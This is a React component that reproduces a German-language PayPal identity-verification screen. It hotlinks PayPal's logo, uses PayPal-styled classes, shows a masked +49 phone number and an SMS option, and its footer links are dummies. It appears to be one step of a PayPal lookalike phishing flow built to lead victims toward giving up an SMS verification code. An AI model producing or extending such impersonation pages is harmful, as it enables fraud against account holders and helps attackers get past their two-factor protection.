import { useState } from 'react';
import '../styles/PayPalStyle.css';

interface Form2Props {
  onSubmit: (code: string) => void;
  error?: string;
}

function Form2({ onSubmit, error }: Form2Props) {
  // We'll still need code state for when we get to the actual code entry screen
  const [code, setCode] = useState('sms');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // For now, just pass an empty string or placeholder since this is just the verification method selection screen
    onSubmit(code || "placeholder");
  };

  return (
    <div className="paypal-container">
      <div className="paypal-form-container">
        <div className="paypal-logo-container">
          <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="PayPal Logo" className="paypal-logo-img" />
        </div>
        
        <form onSubmit={handleSubmit} className="paypal-form">
          <h1 className="paypal-form-title">
            Bestätigen Sie jetzt Ihre Identität
          </h1>
          
          <div className="paypal-form-options">
            <div className="paypal-option-item">
              <label className="paypal-radio-container">
                <input 
                  type="radio" 
                  name="verification-method" 
                  defaultChecked
                  readOnly
                  onClick={() => setCode('sms')}
                />
                <span className="paypal-radio-checkmark"></span>
                <div className="paypal-option-text">
                  <div className="paypal-option-title">SMS zusenden</div>
                  <div className="paypal-option-description">Handy +49 *** *******</div>
                </div>
              </label>
            </div>
          </div>
          
          <div className="paypal-disclaimer">
            Sie bestätigen, dass Sie diese Telefonnummer benutzen dürfen. Sie stimmen zu, SMS zur Bestätigung Ihrer Identität in dieser Sitzung zu erhalten. Es können Gebühren Ihres Mobilfunkanbieters anfallen.
          </div>
          
          {error && <div className="paypal-error-message">{error}</div>}
          
          <div className="paypal-button-container">
            <button type="submit" className="paypal-button-primary">
              Weiter
            </button>
          </div>
        </form>
      </div>
      
      <div className="paypal-footer">
        <a href="#">Kontakt</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
        <a href="#">Impressum</a>
        <a href="#">Weltweit</a>
      </div>
    </div>
  );
}

export default Form2;
